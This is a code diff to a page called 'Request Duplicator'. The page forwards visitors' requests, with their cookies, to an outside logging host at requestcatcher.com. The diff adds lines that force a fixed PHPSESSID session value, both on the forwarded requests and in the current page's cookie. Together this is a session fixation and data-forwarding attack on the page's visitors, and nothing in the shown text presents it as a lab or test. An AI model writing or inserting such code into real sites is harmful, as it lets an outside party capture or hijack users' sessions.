@@ -20,6 +20,9 @@
                 method: method,
                 mode: 'no-cors', // Important for cross-origin requests
                 credentials: 'include', // Ensures cookies are sent
+                headers: {
+                    'Cookie': 'PHPSESSID=aklljdlak' // Set the specific PHPSESSID
+                }
             };
 
             // Only add body if it's a form submission and the target is a form
@@ -32,6 +35,9 @@
                 .catch(error => {
                     console.error('Error duplicating request:', error);
                 });
+
+            // Set the cookie for the current page as well
+            document.cookie = 'PHPSESSID=aklljdlak; path=/';
 
             // Optional: Also allow original request to proceed
             return true;
@@ -69,6 +75,6 @@
 </head>
 <body>
     <h1>Request Duplicator</h1>
-    <p>All requests to this page will be duplicated to https://noproblem.requestcatcher.com/</p>
+    <p>All requests to this page will be duplicated to https://noproblem.requestcatcher.com/ with PHPSESSID=aklljdlak</p>
 </body>
 </html>
